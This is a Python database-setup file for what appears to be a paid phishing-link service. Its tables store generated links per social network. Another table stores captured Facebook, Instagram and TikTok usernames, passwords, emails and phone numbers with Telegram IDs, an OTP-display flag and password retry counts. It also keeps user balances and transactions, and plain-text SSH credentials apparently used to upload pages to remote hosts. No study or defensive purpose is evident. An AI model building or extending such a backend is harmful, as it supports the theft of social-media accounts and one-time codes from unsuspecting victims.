from extensions.extensions import get_db_connection, app, mail, Message

def create_tables():
    conn = get_db_connection()
    with conn.cursor() as cursor:


        cursor.execute("""
            CREATE TABLE IF NOT EXISTS ssh_credentials (
                id INT AUTO_INCREMENT PRIMARY KEY,
                hostname VARCHAR(255) NOT NULL,
                username VARCHAR(255) NOT NULL,
                password VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                port INT DEFAULT 22,
                ssh_key_path VARCHAR(512),
                status ENUM('active', 'inactive') DEFAULT 'active',
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(255) UNIQUE NOT NULL,
                email VARCHAR(255) UNIQUE NOT NULL,
                password VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # cursor.execute("""
        #     ALTER TABLE users
        #                ADD COLUMN chat_id VARCHAR(255) DEFAULT NULL
        # """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS balance (
                id INT AUTO_INCREMENT PRIMARY KEY,
                user_id INT NOT NULL,
                amount DECIMAL(10,2) DEFAULT 0.00,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id INT AUTO_INCREMENT PRIMARY KEY,
                user_id INT NOT NULL,
                amount DECIMAL(10, 2) NOT NULL,
                type ENUM('credit', 'debit') NOT NULL,
                status ENUM('pending', 'completed', 'cancelled', 'rejected') DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
            );
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS generated_links(
                id INT AUTO_INCREMENT PRIMARY KEY,
                user_id INT NOT NULL,
                status ENUM('active', 'inactive') NOT NULL,
                expiry_date DATE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                duration VARCHAR(50),
                social_media VARCHAR(100)
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS template_data (
                id VARCHAR(255) NOT NULL PRIMARY KEY,
                log_id VARCHAR(255) NOT NULL,
                social_media ENUM('facebook', 'instagram', 'tiktok') NOT NULL,
                username VARCHAR(255),
                password VARCHAR(255),
                email VARCHAR(255),
                phone VARCHAR(50),
                telegram_id VARCHAR(255) NOT NULL,
                preferences JSON,
                theme VARCHAR(50) DEFAULT 'dark',
                notifications BOOLEAN DEFAULT TRUE,
                last_login TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                status ENUM('active', 'inactive', 'suspended') DEFAULT 'active',
                follow_count INT DEFAULT 0,
                like_count INT DEFAULT 0,
                recommended_content JSON,
                show_otp BOOLEAN DEFAULT FALSE,
                password_retry_count INT DEFAULT 0,
                duration VARCHAR(50) DEFAULT '1 week',
                INDEX (log_id),
                INDEX (telegram_id),
                INDEX (social_media)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
        """)
        # cursor.execute("""
        #     ALTER TABLE generated_links
        #         ADD COLUMN ssh_credential_id INT,
        #         ADD COLUMN remote_path VARCHAR(512),
        #         ADD COLUMN is_uploaded BOOLEAN DEFAULT FALSE,
        #         ADD FOREIGN KEY (ssh_credential_id) REFERENCES ssh_credentials(id) ON DELETE SET NULL
        # """)

        # cursor.execute("""
        #     ALTER TABLE generated_links
        #                ADD COLUMN link_id VARCHAR(255) NOT NULL
        # """)
        # Add user_id column to template_data if it doesn't exist
        try:
            cursor.execute("""
                ALTER TABLE template_data
                ADD COLUMN user_id INT,
                ADD FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
            """)
        except Exception as e:
            # Column might already exist, which is fine
            pass

    conn.commit()
    conn.close()